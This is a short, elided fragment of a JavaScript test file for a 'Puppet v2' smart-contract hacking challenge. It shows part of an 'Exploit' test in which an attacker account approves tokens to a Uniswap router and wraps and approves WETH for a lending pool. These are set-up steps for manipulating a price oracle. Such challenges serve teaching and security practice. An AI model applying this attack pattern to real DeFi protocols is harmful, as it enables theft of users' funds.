...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    await this.token
      .connect(attacker)
      .approve(this.uniswapRouter.address, ethers.utils.parseEther("9999"));
    ...
    await this.weth
      .connect(attacker)
      .deposit({ value: ethers.utils.parseEther("29.8") });

    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, ethers.utils.parseEther("29.8"));
